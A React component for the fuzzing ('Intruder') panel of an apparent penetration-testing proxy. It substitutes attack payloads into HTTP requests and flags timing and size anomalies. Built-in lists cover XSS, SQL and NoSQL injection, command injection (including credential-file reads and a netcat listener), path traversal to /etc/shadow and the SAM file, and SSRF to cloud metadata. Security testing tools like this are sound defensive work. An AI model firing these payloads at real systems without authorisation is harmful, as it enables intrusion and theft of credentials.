import React, { useState, useEffect, useMemo, memo } from 'react';
import { HttpRequest } from '../../main/proxy-server';
import { requestDetailEqual } from '../utils/requestEqual';
import { EmptyState } from './EmptyState';
import { IntruderHeaderIcon } from './ToolIcons';
import './Intruder.css';

interface IntruderProps {
  request: HttpRequest | null;
}

interface PayloadSet {
  name: string;
  payloads: string[];
}

interface AttackResult {
  payload: string;
  request: HttpRequest;
  response: {
    status: number;
    statusText: string;
    headers: Record<string, string>;
    body: string;
    time: number;
  };
  error?: string;
}

function median(arr: number[]): number {
  if (arr.length === 0) return 0;
  const s = [...arr].sort((a, b) => a - b);
  const m = Math.floor(s.length / 2);
  return s.length % 2 ? s[m]! : (s[m - 1]! + s[m]!) / 2;
}

function getTimingSizeAnomalies(results: AttackResult[]): Map<number, 'timing' | 'size'> {
  const out = new Map<number, 'timing' | 'size'>();
  const valid = results.filter((r) => !r.error && r.response.status > 0);
  if (valid.length < 3) return out;
  const times = valid.map((r) => r.response.time).filter((t) => t >= 0);
  const lengths = valid.map((r) => r.response.body.length);
  const medTime = median(times);
  const medLen = median(lengths);
  results.forEach((r, i) => {
    if (r.error || r.response.status === 0) return;
    const t = r.response.time;
    const len = r.response.body.length;
    if (medTime > 50 && (t > 2 * medTime || (t < 0.4 * medTime && t > 0))) out.set(i, 'timing');
    if (medLen > 0 && (len > 2 * medLen || (len < 0.25 * medLen && len >= 0))) {
      if (!out.has(i)) out.set(i, 'size');
    }
  });
  return out;
}

const Intruder: React.FC<IntruderProps> = ({ request }) => {
  const [selectedPayloadSet, setSelectedPayloadSet] = useState<string>('xss');
  const [customPayloads, setCustomPayloads] = useState<string>('');
  const [attackResults, setAttackResults] = useState<AttackResult[]>([]);
  const [isAttacking, setIsAttacking] = useState(false);
  const [attackProgress, setAttackProgress] = useState(0);
  const [threads, setThreads] = useState<number>(5);
  const [delay, setDelay] = useState<number>(100);
  
  // Request editor state
  const [editedRequest, setEditedRequest] = useState<HttpRequest | null>(null);
  const [requestMethod, setRequestMethod] = useState<string>('GET');
  const [requestUrl, setRequestUrl] = useState<string>('');
  const [requestHeaders, setRequestHeaders] = useState<Record<string, string>>({});
  const [requestBody, setRequestBody] = useState<string>('');
  const [fuzzPositions, setFuzzPositions] = useState<string[]>([]);

  const payloadSets: Record<string, PayloadSet> = {
    xss: {
      name: 'XSS Payloads',
      payloads: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        'javascript:alert(1)',
        '<iframe src=javascript:alert(1)>',
        '<body onload=alert(1)>',
        '<input autofocus onfocus=alert(1)>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<keygen onfocus=alert(1) autofocus>',
        '<video><source onerror="alert(1)">',
        '<audio src=x onerror=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
      ],
    },
    sql: {
      name: 'SQL Injection',
      payloads: [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin' --",
        "admin' #",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR ('1'='1--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "' OR SLEEP(5)--",
      ],
    },
    command: {
      name: 'Command Injection',
      payloads: [
        '; ls',
        '| ls',
        '|| ls',
        '&& ls',
        '`ls`',
        '$(ls)',
        '; cat /etc/passwd',
        '| cat /etc/passwd',
        '; whoami',
        '| whoami',
        '; id',
        '| id',
        '; uname -a',
        '| uname -a',
        '; ping -c 3 127.0.0.1',
        '| ping -c 3 127.0.0.1',
        '; sleep 5',
        '| sleep 5',
        '; nc -l -p 4444',
        '| nc -l -p 4444',
      ],
    },
    path: {
      name: 'Path Traversal',
      payloads: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%2f..%2f..%2fetc%2fpasswd',
        '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '....//....//windows/system32/config/sam',
        '/etc/passwd',
        'C:\\windows\\system32\\config\\sam',
        '/proc/self/environ',
        '/proc/version',
        '/etc/shadow',
        '/etc/hosts',
      ],
    },
    ssrf: {
      name: 'SSRF Payloads',
      payloads: [
        'http://127.0.0.1',
        'http://localhost',
        'http://127.0.0.1:80',
        'http://127.0.0.1:443',
        'http://127.0.0.1:8080',
        'http://127.0.0.1:3306',
        'http://127.0.0.1:5432',
        'http://127.0.0.1:6379',
        'http://169.254.169.254',
        'http://169.254.169.254/latest/meta-data/',
        'file:///etc/passwd',
        'file:///C:/windows/system32/config/sam',
        'gopher://127.0.0.1:80',
        'dict://127.0.0.1:11211',
        'http://[::1]',
        'http://[::1]:80',
      ],
    },
    nosql: {
      name: 'NoSQL Injection',
      payloads: [
        '{"$ne": null}',
        '{"$ne": ""}',
        '{"$gt": ""}',
        '{"$gt": 0}',
        '{"$regex": ".*"}',
        '{"$where": "this.username == this.password"}',
        '{"$or": [{"username": "admin"}, {"password": "admin"}]}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"$expr": {"$eq": ["$username", "$password"]}}',
        '{"username": {"$in": ["admin", "administrator"]}}',
        '{"$where": "1==1"}',
        '{"$where": "this.username.length > 0"}',
      ],
    },
  };

  // Initialize request editor when request changes
  useEffect(() => {
    if (request) {
      setEditedRequest({ ...request });
      setRequestMethod(request.method || 'GET');
      setRequestUrl(request.url || '');
      setRequestHeaders({ ...request.headers });
      setRequestBody(request.body || '');
      setFuzzPositions([]);
    }
  }, [request]);

  // Extract fuzz positions from request (marked with §§)
  const extractFuzzPositions = (text: string): string[] => {
    const positions: string[] = [];
    const regex = /§([^§]+)§/g;
    let match;
    while ((match = regex.exec(text)) !== null) {
      positions.push(match[1]);
    }
    return positions;
  };

  // Replace fuzz positions with payload
  const replaceFuzzPositions = (text: string, payload: string): string => {
    return text.replace(/§[^§]+§/g, payload);
  };

  const handleStartAttack = async () => {
    if (!editedRequest) return;

    setIsAttacking(true);
    setAttackResults([]);
    setAttackProgress(0);

    const payloads = customPayloads
      ? customPayloads.split('\n').filter(p => p.trim())
      : payloadSets[selectedPayloadSet]?.payloads || [];

    if (payloads.length === 0) {
      alert('No payloads to test');
      setIsAttacking(false);
      return;
    }

    // Check if there are fuzz positions
    const urlFuzzPositions = extractFuzzPositions(requestUrl);
    const bodyFuzzPositions = extractFuzzPositions(requestBody);
    const headerFuzzPositions = Object.values(requestHeaders).some(h => /§[^§]+§/.test(h));
    
    if (urlFuzzPositions.length === 0 && bodyFuzzPositions.length === 0 && !headerFuzzPositions) {
      alert('No fuzz positions found! Mark values to fuzz with §value§ (e.g., §username§)');
      setIsAttacking(false);
      return;
    }

    const results: AttackResult[] = [];
    const totalPayloads = payloads.length;
    let completed = 0;

    // Process payloads with threading
    const processPayload = async (payload: string, index: number) => {
      try {
        const modifiedRequest: HttpRequest = {
          id: editedRequest.id || `fuzz-${Date.now()}-${index}`,
          method: requestMethod,
          url: replaceFuzzPositions(requestUrl, payload),
          headers: { ...requestHeaders },
          body: replaceFuzzPositions(requestBody, payload),
          timestamp: Date.now(),
          status: 0,
          responseHeaders: {},
          responseBody: '',
          contentType: editedRequest.contentType || '',
          notes: editedRequest.notes || '',
          tags: editedRequest.tags || [],
          source: editedRequest.source || 'intruder',
        };

        // Replace fuzz positions in headers
        Object.keys(modifiedRequest.headers).forEach(key => {
          modifiedRequest.headers[key] = replaceFuzzPositions(modifiedRequest.headers[key], payload);
        });

        const startTime = Date.now();

        // Send request
        const result = await window.electronAPI.repeatRequest(modifiedRequest);
        const endTime = Date.now();
        const responseTime = endTime - startTime;

        results.push({
          payload,
          request: modifiedRequest,
          response: {
            status: result.status || 0,
            statusText: '',
            headers: result.responseHeaders || {},
            body: result.responseBody || '',
            time: responseTime,
          },
        });

        completed++;
        setAttackProgress(Math.round((completed / totalPayloads) * 100));

        // Delay between requests
        if (delay > 0) {
          await new Promise(resolve => setTimeout(resolve, delay));
        }
      } catch (error: any) {
        completed++;
        setAttackProgress(Math.round((completed / totalPayloads) * 100));
        const errorRequest: HttpRequest = request ? {
          ...request,
          id: request.id || `error-${Date.now()}`,
        } : {
          id: `error-${Date.now()}`,
          method: 'GET',
          url: '',
          headers: {},
          body: '',
          timestamp: Date.now(),
          status: 0,
          responseHeaders: {},
          responseBody: '',
          contentType: '',
          notes: '',
          tags: [],
          source: 'intruder',
        };
        results.push({
          payload,
          request: errorRequest,
          response: {
            status: 0,
            statusText: '',
            headers: {},
            body: '',
            time: 0,
          },
          error: error.message || 'Request failed',
        });
      }
    };

    // Process payloads with threading
    const threadsArray = Array.from({ length: threads }, (_, i) => i);
    for (let i = 0; i < payloads.length; i += threads) {
      const batch = payloads.slice(i, i + threads);
      await Promise.all(batch.map((payload, idx) => processPayload(payload, i + idx)));
    }

    setAttackResults(results);
    setIsAttacking(false);
    setAttackProgress(100);
  };

  const handleStopAttack = () => {
    setIsAttacking(false);
  };

  const getStatusColor = (status: number): string => {
    if (status >= 200 && status < 300) return '#2ecc71';
    if (status >= 300 && status < 400) return '#f39c12';
    if (status >= 400 && status < 500) return '#e74c3c';
    if (status >= 500) return '#9b59b6';
    return '#858585';
  };

  const anomalyMap = useMemo(() => getTimingSizeAnomalies(attackResults), [attackResults]);

  if (!request) {
    return (
      <div className="intruder-view empty-state">
        <EmptyState icon="intruder" title="Select a request to start fuzzing" brandName="CleanTraffic" />
      </div>
    );
  }

  return (
    <div className="intruder-view">
      <div className="intruder-header">
        <div className="intruder-title">
          <IntruderHeaderIcon />
        </div>
        <p className="intruder-subtitle">Automated payload testing and fuzzing</p>
      </div>

      <div className="intruder-content">
        <div className="intruder-config">
          <div className="config-section">
            <label>Payload Set</label>
            <select
              value={selectedPayloadSet}
              onChange={(e) => setSelectedPayloadSet(e.target.value)}
              disabled={isAttacking}
            >
              {Object.entries(payloadSets).map(([key, set]) => (
                <option key={key} value={key}>
                  {set.name} ({set.payloads.length} payloads)
                </option>
              ))}
            </select>
          </div>

          <div className="config-section">
            <label>Custom Payloads (one per line)</label>
            <textarea
              value={customPayloads}
              onChange={(e) => setCustomPayloads(e.target.value)}
              placeholder="Enter custom payloads, one per line..."
              rows={4}
              disabled={isAttacking}
            />
          </div>

          <div className="request-editor-section">
            <h3>Request Editor</h3>
            <p className="editor-hint">Mark values to fuzz with §value§ (e.g., username=§admin§ or {"{"}"id": "§123§"{"}"})</p>
            
            <div className="editor-row">
              <label>Method</label>
              <select
                value={requestMethod}
                onChange={(e) => setRequestMethod(e.target.value)}
                disabled={isAttacking}
                className="method-select"
              >
                <option value="GET">GET</option>
                <option value="POST">POST</option>
                <option value="PUT">PUT</option>
                <option value="DELETE">DELETE</option>
                <option value="PATCH">PATCH</option>
                <option value="HEAD">HEAD</option>
                <option value="OPTIONS">OPTIONS</option>
              </select>
            </div>

            <div className="editor-row">
              <label>URL</label>
              <input
                type="text"
                value={requestUrl}
                onChange={(e) => setRequestUrl(e.target.value)}
                placeholder="https://example.com/api/users?id=§123§"
                disabled={isAttacking}
                className="url-input"
              />
            </div>

            <div className="editor-row">
              <label>Headers</label>
              <textarea
                value={Object.entries(requestHeaders).map(([k, v]) => `${k}: ${v}`).join('\n')}
                onChange={(e) => {
                  const lines = e.target.value.split('\n');
                  const newHeaders: Record<string, string> = {};
                  lines.forEach(line => {
                    const colonIndex = line.indexOf(':');
                    if (colonIndex > 0) {
                      const key = line.substring(0, colonIndex).trim();
                      const value = line.substring(colonIndex + 1).trim();
                      if (key) newHeaders[key] = value;
                    }
                  });
                  setRequestHeaders(newHeaders);
                }}
                placeholder="Content-Type: application/json&#10;Authorization: Bearer §token§"
                rows={6}
                disabled={isAttacking}
                className="headers-textarea"
              />
            </div>

            <div className="editor-row">
              <label>Body</label>
              <textarea
                value={requestBody}
                onChange={(e) => setRequestBody(e.target.value)}
                placeholder='{"username": "§admin§", "password": "§test§"}'
                rows={8}
                disabled={isAttacking}
                className="body-textarea"
              />
            </div>

            <div className="fuzz-positions-info">
              <strong>Fuzz Positions Found:</strong>
              <div className="positions-list">
                {extractFuzzPositions(requestUrl + '\n' + requestBody + '\n' + Object.values(requestHeaders).join('\n')).length > 0 ? (
                  extractFuzzPositions(requestUrl + '\n' + requestBody + '\n' + Object.values(requestHeaders).join('\n')).map((pos, idx) => (
                    <span key={idx} className="position-tag">§{pos}§</span>
                  ))
                ) : (
                  <span className="no-positions">No fuzz positions marked. Use §value§ to mark positions.</span>
                )}
              </div>
            </div>
          </div>

          <div className="config-row">
            <div className="config-section">
              <label>Threads</label>
              <input
                type="number"
                value={threads}
                onChange={(e) => setThreads(Math.max(1, parseInt(e.target.value) || 1))}
                min="1"
                max="20"
                disabled={isAttacking}
              />
            </div>

            <div className="config-section">
              <label>Delay (ms)</label>
              <input
                type="number"
                value={delay}
                onChange={(e) => setDelay(Math.max(0, parseInt(e.target.value) || 0))}
                min="0"
                disabled={isAttacking}
              />
            </div>
          </div>

          <div className="intruder-actions">
            {!isAttacking ? (
              <button className="attack-btn start" onClick={handleStartAttack}>
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                  <path d="M3 2L13 8L3 14V2Z" fill="currentColor"/>
                </svg>
                Start Attack
              </button>
            ) : (
              <button className="attack-btn stop" onClick={handleStopAttack}>
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                  <rect x="4" y="4" width="8" height="8" fill="currentColor"/>
                </svg>
                Stop Attack
              </button>
            )}
          </div>

          {isAttacking && (
            <div className="attack-progress">
              <div className="progress-bar">
                <div
                  className="progress-fill"
                  style={{ width: `${attackProgress}%` }}
                />
              </div>
              <span className="progress-text">{attackProgress}%</span>
            </div>
          )}
        </div>

        {attackResults.length > 0 && (
          <div className="attack-results">
            <div className="results-header">
              <h3>Attack Results ({attackResults.length})</h3>
              <div className="results-stats">
                <span className="stat-item success">
                  {attackResults.filter(r => r.response.status >= 200 && r.response.status < 300).length} Success
                </span>
                <span className="stat-item error">
                  {attackResults.filter(r => r.response.status >= 400).length} Errors
                </span>
                <span className="stat-item">
                  Avg: {Math.round(attackResults.reduce((sum, r) => sum + r.response.time, 0) / attackResults.length)}ms
                </span>
                {anomalyMap.size > 0 ? (
                  <span className="stat-item anomaly" title="Timing/size anomalies – possible blind injection">
                    {anomalyMap.size} Anomalies
                  </span>
                ) : null}
              </div>
            </div>

            <div className="results-list">
              {attackResults.map((result, index) => {
                const anomaly = anomalyMap.get(index);
                return (
                <div key={index} className={`result-item ${anomaly ? 'has-anomaly' : ''}`}>
                  <div className="result-header">
                    <span className="result-index">#{index + 1}</span>
                    {anomaly && (
                      <span className="anomaly-badge" title={anomaly === 'timing' ? 'Timing anomaly – possible blind injection' : 'Response size anomaly'}>
                        {anomaly === 'timing' ? '⏱' : '📏'}
                      </span>
                    )}
                    <span
                      className="status-badge"
                      style={{ backgroundColor: getStatusColor(result.response.status) }}
                    >
                      {result.response.status || 'ERR'}
                    </span>
                    <span className="result-time">{result.response.time}ms</span>
                    <span className="result-payload">{result.payload}</span>
                  </div>
                  {result.error && (
                    <div className="result-error">Error: {result.error}</div>
                  )}
                  {result.response.body && (
                    <div className="result-body">
                      <details>
                        <summary>Response Body ({result.response.body.length} bytes)</summary>
                        <pre>{result.response.body.substring(0, 500)}</pre>
                      </details>
                    </div>
                  )}
                </div>
              );
              })}
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default memo(Intruder, (prev, next) => requestDetailEqual(prev.request, next.request));

